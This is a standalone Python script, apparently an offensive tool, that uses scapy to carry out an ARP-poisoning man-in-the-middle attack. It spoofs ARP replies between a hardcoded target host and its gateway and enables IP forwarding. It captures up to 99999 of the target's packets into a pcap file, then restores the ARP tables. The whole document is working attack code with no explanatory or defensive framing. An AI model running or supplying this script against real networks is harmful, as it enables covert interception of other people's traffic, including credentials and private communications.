import os,sys,multiprocessing
from scapy.all import *

interface = 'eth0'
targetIP = '192.168.0.17'
gateIP = '192.168.0.1'
# for more data, modify # of packets to capture
packets = 99999
logfile = 'log.pcap'
bcast = 'ff:ff:ff:ff:ff:ff'

def ip2mac(ip):
    rsp = srp1(Ether(dst=bcast) / ARP(pdst=ip),timeout=2,retry=3)
    return rsp[Ether].src

def arpPoison(gateIP,gateMAC,targetIP,targetMAC):
    while True:
        try:
            print('[+] ARP poisoning [CTRL-C to stop]')
            send(ARP(op=2,psrc=gateIP,pdst=targetIP,hwdst=targetMAC))
            send(ARP(op=2,psrc=targetIP,pdst=gateIP,hwdst=gateMAC))
            time.sleep(2)
        except KeyboardInterrupt:
            pass

def arpRestore(gateIP,gateMAC,targetIP,targetMAC):
    for x in range(5):
        print('[+] Restoring ARP table [' + str(x) + ' of 4]')
        send(ARP(op=2,psrc=gateIP,pdst=targetIP,hwdst=bcast,hwsrc=gateMAC), count=5)
        send(ARP(op=2,psrc=targetIP,pdst=gateIP,hwdst=bcast,hwsrc=targetMAC), count=5)
        time.sleep(2)

if __name__ == '__main__':
    conf.iface = interface
    conf.verb = 0
    gateMAC = ip2mac(gateIP)
    targetMAC = ip2mac(targetIP)
    print('[*] Interface: ' +interface)
    print('[*] Gateway: ' + gateIP + ' [' + gateMAC + ']')
    print('[*] Target: ' + targetIP + ' [' + targetMAC + ']')
    print('[*] Enable packet forwarding... ')
    os.system('/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1')

    p=multiprocessing.Process(target=arpPoison,args=(gateIP, gateMAC, targetIP, targetMAC,))
    p.start()

    print('[*] Sniffing packets...')
    packets = sniff(count=packets,filter=('ip host ' + targetIP),iface=interface)
    wrpcap(logfile,packets)
    p.terminate()

    print('[*] Sniffing complete.')
    print('[*] Disable packet forwarding...')
    os.system('/sbin/sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1')
    arpRestore(gateIP,gateMAC,targetIP,targetMAC)
    print('[*] Exiting...')
